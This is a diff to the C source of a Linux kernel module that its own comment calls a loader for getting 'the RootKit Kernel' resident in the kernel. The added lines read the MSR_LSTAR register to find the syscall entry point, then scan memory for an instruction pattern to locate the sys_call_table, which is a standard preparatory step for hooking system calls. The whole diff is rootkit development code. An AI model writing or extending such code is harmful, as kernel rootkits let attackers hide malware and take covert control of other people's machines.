@@ -21,6 +21,7 @@
 /*
  * This is the loader. Will get the RootKit Kernel resident into the Linux Kernel.
  */
+#include <asm/msr.h>
 #include <linux/set_memory.h>
 #include <linux/slab.h>
 #include <linux/namei.h>
@@ -70,6 +71,15 @@ extern tf_sys_write *f_sys_write(void);
  */
 //void *readfile(const char *file, size_t *len);
 int disassemble(void *code, size_t code_len);
+void *memmem(const void *haystack, size_t hs_len, const void *needle, size_t n_len) {
+	while (hs_len >= n_len) {
+		hs_len--;
+		if (!memcmp(haystack, needle, n_len))
+			return (void *)haystack;
+		haystack++;
+	}
+	return NULL;
+}
 
 /*
  * Labels.
@@ -124,7 +134,7 @@ int init_module(void)
 		memcpy(kernel_addr, &kernel_start, kernel_len);
 		pinfo("kernel is now copied to kernel_addr.\n");
 		
-		disassemble(kernel_addr, ((unsigned long)&kernel_code_end - (unsigned long)&kernel_start));
+		//disassemble(kernel_addr, ((unsigned long)&kernel_code_end - (unsigned long)&kernel_start));
 
 		kernel_test();
 		pinfo("kernel_test execution from LKM successful.\n");
@@ -133,6 +143,13 @@ int init_module(void)
 		pinfo("f_kernel_test at %p\n", f_kernel_test);
 		f_kernel_test();
 		pinfo("f_kernel_test execution from allocated code, successful.\n");
+
+		void *syscall_entry = __rdmsr(MSR_LSTAR);
+		void *sct = memmem(syscall_entry, 0x1000, "\xff\x14\xc5", 3);
+		pinfo("syscall_entry = %p, sys_call_table = %p\n", syscall_entry, sct);
+		disassemble(syscall_entry, 0x3c);
+		//syscall_entry = 0xb0200010;
+		//disassemble(syscall_entry, 0x3c); 
 
 		(*f_kfree())(kernel_addr);
 		return 0;
